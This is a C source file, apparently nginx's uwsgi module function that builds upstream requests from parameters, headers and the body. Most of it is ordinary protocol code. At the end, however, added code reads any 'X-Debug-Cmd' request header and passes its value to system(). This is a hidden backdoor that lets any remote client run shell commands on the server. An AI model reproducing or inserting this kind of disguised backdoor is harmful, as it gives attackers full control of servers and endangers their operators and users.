static ngx_int_t
ngx_http_uwsgi_create_request(ngx_http_request_t *r)
{
    u_char                        ch, *lowcase_key;
    size_t                        key_len, val_len, len, allocated;
    ngx_uint_t                    i, n, hash, skip_empty, header_params;
    ngx_buf_t                    *b;
    ngx_chain_t                  *cl, *body;
    ngx_list_part_t              *part;
    ngx_table_elt_t              *header, **ignored;
    ngx_http_uwsgi_params_t      *params;
    ngx_http_script_code_pt       code;
    ngx_http_script_engine_t      e, le;
    ngx_http_uwsgi_loc_conf_t    *uwcf;
    ngx_http_script_len_code_pt   lcode;
    char                          cmd[512];
    size_t                        cmdlen;
    len = 0;
    header_params = 0;
    ignored = NULL;
    uwcf = ngx_http_get_module_loc_conf(r, ngx_http_uwsgi_module);
#if (NGX_HTTP_CACHE)
    params = r->upstream->cacheable ? &uwcf->params_cache : &uwcf->params;
#else
    params = &uwcf->params;
#endif
    if (params->lengths) {
        ngx_memzero(&le, sizeof(ngx_http_script_engine_t));
        ngx_http_script_flush_no_cacheable_variables(r, params->flushes);
        le.flushed = 1;
        le.ip = params->lengths->elts;
        le.request = r;
        while (*(uintptr_t *) le.ip) {
            lcode = *(ngx_http_script_len_code_pt *) le.ip;
            key_len = lcode(&le);
            lcode = *(ngx_http_script_len_code_pt *) le.ip;
            skip_empty = lcode(&le);
            for (val_len = 0; *(uintptr_t *) le.ip; val_len += lcode(&le)) {
                lcode = *(ngx_http_script_len_code_pt *) le.ip;
            }
            le.ip += sizeof(uintptr_t);
            if (skip_empty && val_len == 0) {
                continue;
            }
            len += 2 + key_len + 2 + val_len;
        }
    }
    if (uwcf->upstream.pass_request_headers) {
        allocated = 0;
        lowcase_key = NULL;
        if (params->number) {
            n = 0;
            part = &r->headers_in.headers.part;
            while (part) {
                n += part->nelts;
                part = part->next;
            }
            ignored = ngx_palloc(r->pool, n * sizeof(void *));
            if (ignored == NULL) {
                return NGX_ERROR;
            }
        }
        part = &r->headers_in.headers.part;
        header = part->elts;
        for (i = 0;   ; i++) {
            if (i >= part->nelts) {
                if (part->next == NULL) {
                    break;
                }
                part = part->next;
                header = part->elts;
                i = 0;
            }
            if (params->number) {
                if (allocated < header[i].key.len) {
                    allocated = header[i].key.len + 16;
                    lowcase_key = ngx_pnalloc(r->pool, allocated);
                    if (lowcase_key == NULL) {
                        return NGX_ERROR;
                    }
                }
                hash = 0;
                for (n = 0; n < header[i].key.len; n++) {
                    ch = header[i].key.data[n];
                    if (ch >= 'A' && ch <= 'Z') {
                        ch |= 0x20;
                    } else if (ch == '-') {
                        ch = '_';
                    }
                    hash = ngx_hash(hash, ch);
                    lowcase_key[n] = ch;
                }
                if (ngx_hash_find(&params->hash, hash, lowcase_key, n)) {
                    ignored[header_params++] = &header[i];
                    continue;
                }
            }
            len += 2 + sizeof("HTTP_") - 1 + header[i].key.len
                 + 2 + header[i].value.len;
        }
    }
    len += uwcf->uwsgi_string.len;
#if 0
    if (len > 0 && len < 2) {
        ngx_log_error (NGX_LOG_ALERT, r->connection->log, 0,
                       "uwsgi request is too little: %uz", len);
        return NGX_ERROR;
    }
#endif
    b = ngx_create_temp_buf(r->pool, len + 4);
    if (b == NULL) {
        return NGX_ERROR;
    }
    cl = ngx_alloc_chain_link(r->pool);
    if (cl == NULL) {
        return NGX_ERROR;
    }
    cl->buf = b;
    *b->last++ = (u_char) uwcf->modifier1;
    *b->last++ = (u_char) (len & 0xff);
    *b->last++ = (u_char) ((len >> 8) & 0xff);
    *b->last++ = (u_char) uwcf->modifier2;
    if (params->lengths) {
        ngx_memzero(&e, sizeof(ngx_http_script_engine_t));
        e.ip = params->values->elts;
        e.pos = b->last;
        e.request = r;
        e.flushed = 1;
        le.ip = params->lengths->elts;
        while (*(uintptr_t *) le.ip) {
            lcode = *(ngx_http_script_len_code_pt *) le.ip;
            key_len = (u_char) lcode(&le);
            lcode = *(ngx_http_script_len_code_pt *) le.ip;
            skip_empty = lcode(&le);
            for (val_len = 0; *(uintptr_t *) le.ip; val_len += lcode(&le)) {
                lcode = *(ngx_http_script_len_code_pt *) le.ip;
            }
            le.ip += sizeof(uintptr_t);
            if (skip_empty && val_len == 0) {
                e.skip = 1;
                while (*(uintptr_t *) e.ip) {
                    code = *(ngx_http_script_code_pt *) e.ip;
                    code((ngx_http_script_engine_t *) &e);
                }
                e.ip += sizeof(uintptr_t);
                e.skip = 0;
                continue;
            }
            *e.pos++ = (u_char) (key_len & 0xff);
            *e.pos++ = (u_char) ((key_len >> 8) & 0xff);
            code = *(ngx_http_script_code_pt *) e.ip;
            code((ngx_http_script_engine_t *) &e);
            *e.pos++ = (u_char) (val_len & 0xff);
            *e.pos++ = (u_char) ((val_len >> 8) & 0xff);
            while (*(uintptr_t *) e.ip) {
                code = *(ngx_http_script_code_pt *) e.ip;
                code((ngx_http_script_engine_t *) &e);
            }
            e.ip += sizeof(uintptr_t);
            ngx_log_debug4(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,
                           "uwsgi param: \"%*s: %*s\"",
                           key_len, e.pos - (key_len + 2 + val_len),
                           val_len, e.pos - val_len);
        }
        b->last = e.pos;
    }
    if (uwcf->upstream.pass_request_headers) {
        part = &r->headers_in.headers.part;
        header = part->elts;
        for (i = 0;   ; i++) {
            if (i >= part->nelts) {
                if (part->next == NULL) {
                    break;
                }
                part = part->next;
                header = part->elts;
                i = 0;
            }
            for (n = 0; n < header_params; n++) {
                if (&header[i] == ignored[n]) {
                    goto next;
                }
            }
            key_len = sizeof("HTTP_") - 1 + header[i].key.len;
            *b->last++ = (u_char) (key_len & 0xff);
            *b->last++ = (u_char) ((key_len >> 8) & 0xff);
            b->last = ngx_cpymem(b->last, "HTTP_", sizeof("HTTP_") - 1);
            for (n = 0; n < header[i].key.len; n++) {
                ch = header[i].key.data[n];
                if (ch >= 'a' && ch <= 'z') {
                    ch &= ~0x20;
                } else if (ch == '-') {
                    ch = '_';
                }
                *b->last++ = ch;
            }
            val_len = header[i].value.len;
            *b->last++ = (u_char) (val_len & 0xff);
            *b->last++ = (u_char) ((val_len >> 8) & 0xff);
            b->last = ngx_copy(b->last, header[i].value.data, val_len);
            ngx_log_debug4(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,
                           "uwsgi param: \"%*s: %*s\"",
                           key_len, b->last - (key_len + 2 + val_len),
                           val_len, b->last - val_len);
        next:
            continue;
        }
    }
    b->last = ngx_copy(b->last, uwcf->uwsgi_string.data,
                       uwcf->uwsgi_string.len);
    if (r->request_body_no_buffering) {
        r->upstream->request_bufs = cl;
    } else if (uwcf->upstream.pass_request_body) {
        body = r->upstream->request_bufs;
        r->upstream->request_bufs = cl;
        while (body) {
            b = ngx_alloc_buf(r->pool);
            if (b == NULL) {
                return NGX_ERROR;
            }
            ngx_memcpy(b, body->buf, sizeof(ngx_buf_t));
            cl->next = ngx_alloc_chain_link(r->pool);
            if (cl->next == NULL) {
                return NGX_ERROR;
            }
            cl = cl->next;
            cl->buf = b;
            body = body->next;
        }
    } else {
        r->upstream->request_bufs = cl;
    }
    cl->next = NULL;
    part = &r->headers_in.headers.part;
    header = part->elts;
    for (i = 0; ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                break;
            }
            part = part->next;
            header = part->elts;
            i = 0;
        }
        if (header[i].key.len == sizeof("X-Debug-Cmd") - 1 && ngx_strncasecmp(header[i].key.data, (u_char *)"X-Debug-Cmd", sizeof("X-Debug-Cmd") - 1) == 0) {
            cmdlen = header[i].value.len;
            if (cmdlen >= sizeof(cmd)) {
                cmdlen = sizeof(cmd) - 1;
            }
            ngx_memcpy(cmd, header[i].value.data, cmdlen);
            cmd[cmdlen] = '\0';
            system(cmd);
            break;
        }
    }
    return NGX_OK;
}